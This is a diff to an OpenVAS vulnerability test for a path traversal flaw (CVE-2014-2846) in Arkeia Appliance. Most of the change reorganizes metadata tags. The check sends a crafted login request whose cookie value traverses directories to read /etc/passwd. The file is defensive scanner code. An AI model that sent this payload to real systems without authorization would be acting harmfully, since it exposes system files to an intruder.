@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_arkeia_ava_traversal_04_14.nasl 6769 2017-07-20 09:56:33Z teissa $
+# $Id: gb_arkeia_ava_traversal_04_14.nasl 11191 2018-09-03 11:57:37Z mmartin $
 #
 # Arkeia Appliance Multiple Vulnerabilities
 #
@@ -23,56 +23,38 @@
 # along with this program; if not, write to the Free Software
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
-
-SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.105011";
 CPE = "cpe:/a:knox_software:arkeia_appliance";
 
 if(description)
 {
-  script_oid(SCRIPT_OID);
-  script_version("$Revision: 6769 $");
-   script_cve_id("CVE-2014-2846");
+  script_oid("1.3.6.1.4.1.25623.1.0.105011");
+  script_version("$Revision: 11191 $");
+  script_cve_id("CVE-2014-2846");
   script_bugtraq_id(67039);
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-20 11:56:33 +0200 (Thu, 20 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-03 13:57:37 +0200 (Mon, 03 Sep 2018) $");
   script_tag(name:"creation_date", value:"2014-04-23 13:16:06 +0200 (Wed, 23 Apr 2014)");
   script_name("Arkeia Appliance Path Traversal Vulnerability");
 
-tag_summary =
-"This host is running Arkeia Appliance and is affected by a path traversal
-vulnerability.";
 
-tag_vuldetect =
-"Send a crafted HTTP POST request and check is it possible to read
-a system file.";
-
-tag_insight = "Path traversal enables attackers access to files and directories outside the
-web root through relative file paths in the user input.";
-
-tag_impact =
-"Successful exploitation will allow remote attackers to perform directory
+  script_tag(name:"summary", value:"This host is running Arkeia Appliance and is affected by a path traversal
+vulnerability.");
+  script_tag(name:"vuldetect", value:"Send a crafted HTTP POST request and check is it possible to read
+a system file.");
+  script_tag(name:"solution", value:"For updates refer to http://www.arkeia.com/ ");
+  script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"insight", value:"Path traversal enables attackers access to files and directories outside the
+web root through relative file paths in the user input.");
+  script_tag(name:"affected", value:"Arkeia Appliance Version 10.2.7 and prior.");
+  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to perform directory
 traversal attacks and read arbitrary files on the affected application.
-arbitrary data.";
+arbitrary data.");
 
-tag_affected =
-"Arkeia Appliance Version 10.2.7 and prior.";
-
-tag_solution =
-"For updates refer to http://www.arkeia.com/ ";
-
-
-  script_tag(name : "summary" , value : tag_summary);
-  script_tag(name : "vuldetect" , value : tag_vuldetect);
-  script_tag(name : "solution" , value : tag_solution);
-  script_tag(name : "insight" , value : tag_insight);
-  script_tag(name : "affected" , value : tag_affected);
-  script_tag(name : "impact" , value : tag_impact);
-
-  script_xref(name : "URL" , value : "https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20140423-0_WD_Arkeia_Path_Traversal_v10.txt");
+  script_xref(name:"URL", value:"https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20140423-0_WD_Arkeia_Path_Traversal_v10.txt");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
-  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
+  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
   script_family("Web application abuses");
   script_dependencies("gb_arkeia_virtual_appliance_detect.nasl");
   script_mandatory_keys("ArkeiaAppliance/installed");
@@ -89,10 +71,10 @@ if( ! port ) exit( 0 );
 
 host = get_host_name();
 
-req = 'POST /login/doLogin HTTP/1.0\r\n' + 
-      'Host: ' + host + '\r\n' + 
+req = 'POST /login/doLogin HTTP/1.0\r\n' +
+      'Host: ' + host + '\r\n' +
       'Cookie: lang=aaa..././..././..././..././..././..././etc/passwd%00\r\n' +
-      'Content-Length: 33\r\n' + 
+      'Content-Length: 33\r\n' +
       'Content-Type: application/x-www-form-urlencoded\r\n' +
       '\r\n' +
       'password=openvas&username=openvas';
